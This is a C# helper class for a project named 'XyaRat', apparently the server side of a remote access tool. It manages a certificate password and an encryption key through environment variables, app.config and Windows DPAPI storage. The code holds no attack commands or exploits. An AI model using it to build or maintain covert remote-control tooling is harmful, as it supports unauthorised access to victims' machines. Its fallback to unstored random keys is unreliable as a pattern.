using System;
using System.Configuration;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Server.Helper
{
    /// <summary>
    /// Secure configuration manager using DPAPI for Windows
    /// Stores sensitive data encrypted in local machine scope
    /// </summary>
    public static class SecureConfig
    {
        private static readonly string ConfigDirectory = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "XyaRat",
            "Config"
        );

        private static readonly string SecureConfigPath = Path.Combine(ConfigDirectory, "secure.dat");

        /// <summary>
        /// Gets certificate password from secure storage or generates new one
        /// </summary>
        public static string GetCertificatePassword()
        {
            try
            {
                // Try to read from environment variable first (for production)
                var envPassword = Environment.GetEnvironmentVariable("XYARAT_CERT_PASSWORD");
                if (!string.IsNullOrEmpty(envPassword))
                {
                    Logger.Log("[SecureConfig] Using certificate password from environment variable", Logger.LogLevel.Info);
                    return envPassword;
                }

                // Try to read from secure storage
                if (File.Exists(SecureConfigPath))
                {
                    var encrypted = File.ReadAllBytes(SecureConfigPath);
                    var decrypted = ProtectedData.Unprotect(encrypted, null, DataProtectionScope.LocalMachine);
                    var password = Encoding.UTF8.GetString(decrypted);
                    Logger.Log("[SecureConfig] Loaded certificate password from secure storage", Logger.LogLevel.Info);
                    return password;
                }

                // Generate and save new password
                var newPassword = GenerateSecurePassword(32);
                SaveCertificatePassword(newPassword);
                Logger.Log("[SecureConfig] Generated new certificate password", Logger.LogLevel.Warning);
                return newPassword;
            }
            catch (Exception ex)
            {
                Logger.Log($"[SecureConfig] Error loading certificate password: {ex.Message}", Logger.LogLevel.Error);
                // Fallback to generated password (not stored)
                return GenerateSecurePassword(32);
            }
        }

        /// <summary>
        /// Saves certificate password to secure storage using DPAPI
        /// </summary>
        private static void SaveCertificatePassword(string password)
        {
            try
            {
                if (!Directory.Exists(ConfigDirectory))
                {
                    Directory.CreateDirectory(ConfigDirectory);
                }

                var data = Encoding.UTF8.GetBytes(password);
                var encrypted = ProtectedData.Protect(data, null, DataProtectionScope.LocalMachine);
                File.WriteAllBytes(SecureConfigPath, encrypted);

                Logger.Log($"[SecureConfig] Saved certificate password to: {SecureConfigPath}", Logger.LogLevel.Info);
            }
            catch (Exception ex)
            {
                Logger.Log($"[SecureConfig] Error saving certificate password: {ex.Message}", Logger.LogLevel.Error);
            }
        }

        /// <summary>
        /// Generates cryptographically secure random password
        /// </summary>
        private static string GenerateSecurePassword(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=";
            var random = new byte[length];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(random);
            }

            var result = new StringBuilder(length);
            foreach (byte b in random)
            {
                result.Append(chars[b % chars.Length]);
            }
            return result.ToString();
        }

        /// <summary>
        /// Gets encryption key from environment or generates new one
        /// </summary>
        public static string GetEncryptionKey()
        {
            try
            {
                // Try environment variable first
                var envKey = Environment.GetEnvironmentVariable("XYARAT_ENCRYPTION_KEY");
                if (!string.IsNullOrEmpty(envKey))
                {
                    Logger.Log("[SecureConfig] Using encryption key from environment variable", Logger.LogLevel.Info);
                    return envKey;
                }

                // Try app.config
                var configKey = ConfigurationManager.AppSettings["EncryptionKey"];
                if (!string.IsNullOrEmpty(configKey))
                {
                    Logger.Log("[SecureConfig] Using encryption key from app.config", Logger.LogLevel.Info);
                    return configKey;
                }

                // Generate new key
                Logger.Log("[SecureConfig] No encryption key configured, generating random key", Logger.LogLevel.Warning);
                return GenerateSecurePassword(32);
            }
            catch (Exception ex)
            {
                Logger.Log($"[SecureConfig] Error loading encryption key: {ex.Message}", Logger.LogLevel.Error);
                return GenerateSecurePassword(32);
            }
        }

        /// <summary>
        /// Resets secure configuration (deletes encrypted storage)
        /// </summary>
        public static void Reset()
        {
            try
            {
                if (File.Exists(SecureConfigPath))
                {
                    File.Delete(SecureConfigPath);
                    Logger.Log("[SecureConfig] Secure configuration reset", Logger.LogLevel.Warning);
                }
            }
            catch (Exception ex)
            {
                Logger.Log($"[SecureConfig] Error resetting configuration: {ex.Message}", Logger.LogLevel.Error);
            }
        }
    }
}
